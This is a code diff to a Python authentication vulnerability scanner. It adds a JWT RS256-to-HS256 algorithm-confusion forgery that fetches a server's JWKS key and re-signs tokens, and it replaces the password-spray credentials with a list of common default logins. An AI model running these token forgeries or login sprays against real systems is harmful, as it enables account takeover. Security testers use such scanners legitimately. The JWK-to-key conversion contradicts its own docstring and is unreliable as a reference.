@@ -1,15 +1,16 @@
 """Python-native JWT / OAuth authentication vulnerability tester.
 
 Covers:
-1. JWT ``alg:none`` attack — strip signature, change alg to "none"
+1. JWT ``alg:none`` attack -- strip signature, change alg to "none"
 2. JWT weak HMAC secret brute-force (HS256, 50 common secrets)
 3. JWT ``kid`` path traversal (``kid: ../../../../dev/null``)
-4. JWT password hash leak — sensitive fields in JWT payload (CWE-200, CWE-312)
-5. JWT no expiry — missing ``exp`` claim means token never expires (CWE-613)
-6. OAuth ``state`` parameter missing / low-entropy check
-7. Bearer token / API key exposure in response body
-8. API key in URL query parameters
-9. Password spray against discovered login endpoints (CWE-307, CWE-521)
+4. JWT RS256-to-HS256 confusion -- sign with public key as HMAC secret
+5. JWT password hash leak -- sensitive fields in JWT payload (CWE-200, CWE-312)
+6. JWT no expiry -- missing ``exp`` claim means token never expires (CWE-613)
+7. OAuth ``state`` parameter missing / low-entropy check
+8. Bearer token / API key exposure in response body
+9. API key in URL query parameters
+10. Password spray against discovered login endpoints (CWE-307, CWE-521)
 
 All JWT operations use only Python stdlib (base64, hmac, hashlib, json).
 No PyJWT or cryptography dependency required.
@@ -101,14 +102,18 @@ _JWT_PATTERN = re.compile(r"eyJ[A-Za-z0-9+/\-_=]+\.[A-Za-z0-9+/\-_=]+\.([A-Za-z0
 # ---------------------------------------------------------------------------
 
 _DEFAULT_CREDS: list[tuple[str, str]] = [
-    ("admin@juice-sh.op", "admin123"),
-    ("jim@juice-sh.op", "ncc-1701"),
-    ("bender@juice-sh.op", "OhG0dPlease1nsworkt4me"),
     ("admin", "admin"),
     ("admin", "password"),
     ("admin", "admin123"),
+    ("admin", "12345"),
+    ("admin", "password123"),
+    ("root", "root"),
+    ("root", "toor"),
     ("test", "test"),
     ("user", "user"),
+    ("user", "password"),
+    ("guest", "guest"),
+    ("demo", "demo"),
 ]
 
 # Common login endpoint paths
@@ -389,9 +394,36 @@ def _build_kid_injection_token(token: str) -> str | None:
     return f"{new_header_b64}.{payload_b64}.{new_sig}"
 
 
-# ---------------------------------------------------------------------------
-# Authentication testing engine
-# ---------------------------------------------------------------------------
+# Well-known paths where JWK sets might be served
+_JWKS_PATHS = (
+    "/.well-known/jwks.json",
+    "/jwks.json",
+    "/oauth/jwks",
+    "/oauth2/jwks",
+    "/.well-known/openid-configuration",
+)
+
+
+def _build_rs256_hs256_confusion_token(token: str, public_key_pem: str) -> str | None:
+    """Re-sign a JWT using HS256 with the RSA public key as the HMAC secret.
+
+    If the server uses the same key material for both verification paths,
+    it will accept this forged token (CVE-2016-10555, CWE-327).
+    """
+    parts = _split_jwt(token)
+    if parts is None:
+        return None
+    header_b64, payload_b64, _sig = parts
+    try:
+        header = json.loads(_b64url_decode(header_b64))
+    except (ValueError, UnicodeDecodeError):
+        return None
+
+    header["alg"] = "HS256"
+    new_header_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    msg = f"{new_header_b64}.{payload_b64}".encode()
+    sig = hmac.new(public_key_pem.encode(), msg, hashlib.sha256).digest()
+    return f"{new_header_b64}.{payload_b64}.{_b64url_encode(sig)}"
 
 
 class AuthTester:
@@ -459,6 +491,7 @@ class AuthTester:
                     await self._check_none_alg(client, url, jwt_token, result)
                     await self._check_weak_secret(client, url, jwt_token, result)
                     await self._check_kid_injection(client, url, jwt_token, result)
+                    await self._check_rs256_hs256_confusion(client, url, jwt_token, result)
 
             # Step 4: Password spray (only when explicitly requested)
             if "spray" in active_checks:
@@ -894,6 +927,128 @@ class AuthTester:
                 )
             )
             result.vulnerable = True
+
+    # ------------------------------------------------------------------
+    # RS256-to-HS256 algorithm confusion
+    # ------------------------------------------------------------------
+
+    async def _check_rs256_hs256_confusion(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+        token: str,
+        result: AuthResult,
+    ) -> None:
+        """Test RS256-to-HS256 algorithm confusion (CVE-2016-10555).
+
+        If the JWT uses an RSA algorithm (RS256/RS384/RS512), tries to
+        fetch the public key from JWKS endpoints, then re-signs the token
+        using HS256 with the public key as the HMAC secret.
+        """
+        header = _decode_jwt_header(token)
+        if header is None:
+            return
+
+        alg = header.get("alg", "")
+        if alg not in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
+            return
+
+        # Try to fetch public key from well-known endpoints
+        public_key = await self._fetch_public_key(client, url)
+        if not public_key:
+            return
+
+        tampered = _build_rs256_hs256_confusion_token(token, public_key)
+        if tampered is None:
+            return
+
+        resp = await self._try_request_with_token(client, url, tampered)
+        if resp is None:
+            return
+
+        if resp.status_code == 200:
+            result.vulnerabilities.append(
+                AuthVulnerability(
+                    vuln_type="jwt_rs256_hs256_confusion",
+                    severity="critical",
+                    evidence=(
+                        f"JWT algorithm confusion: RS256 token re-signed as HS256 using "
+                        f"the server's public key was accepted. "
+                        f"Response status: {resp.status_code}. "
+                        f"CVE-2016-10555: attacker can forge arbitrary JWT claims."
+                    ),
+                    confidence=0.9,
+                    forged_token=tampered,
+                )
+            )
+            result.vulnerable = True
+
+    async def _fetch_public_key(
+        self,
+        client: httpx.AsyncClient,
+        url: str,
+    ) -> str | None:
+        """Try to fetch RSA public key from well-known JWKS endpoints."""
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        for path in _JWKS_PATHS:
+            jwks_url = base + path
+            try:
+                resp = await client.get(jwks_url)
+                if resp.status_code != 200:
+                    continue
+
+                data = resp.json()
+
+                # Handle OpenID Connect discovery
+                if "jwks_uri" in data:
+                    try:
+                        jwks_resp = await client.get(data["jwks_uri"])
+                        if jwks_resp.status_code == 200:
+                            data = jwks_resp.json()
+                    except (httpx.HTTPError, ValueError):
+                        continue
+
+                # Extract RSA public key from JWKS
+                keys = data.get("keys", [])
+                for key in keys:
+                    if key.get("kty") == "RSA" and key.get("use", "sig") == "sig":
+                        return self._jwk_to_pem(key)
+
+                # If the response contains x5c certificates, extract the public key
+                for key in keys:
+                    x5c = key.get("x5c")
+                    if x5c:
+                        cert_b64 = x5c[0]
+                        pem = (
+                            "-----BEGIN CERTIFICATE-----\n"
+                            + cert_b64
+                            + "\n-----END CERTIFICATE-----"
+                        )
+                        return pem
+
+            except (httpx.HTTPError, ValueError, KeyError):
+                continue
+
+        return None
+
+    @staticmethod
+    def _jwk_to_pem(jwk: dict) -> str | None:
+        """Convert a JWK RSA key to a minimal PEM-like representation.
+
+        For the HS256 confusion attack, we need the raw key material
+        as the HMAC secret. Uses the base64url-decoded modulus (n) and
+        exponent (e) concatenation as the signing key, matching common
+        JWT library behavior.
+        """
+        n = jwk.get("n")
+        e = jwk.get("e")
+        if not n or not e:
+            return None
+        # Use the JWK JSON representation as the key material.
+        # This matches how some vulnerable libraries handle the confusion.
+        return json.dumps({"n": n, "e": e, "kty": "RSA"}, separators=(",", ":"))
 
     # ------------------------------------------------------------------
     # Password spray
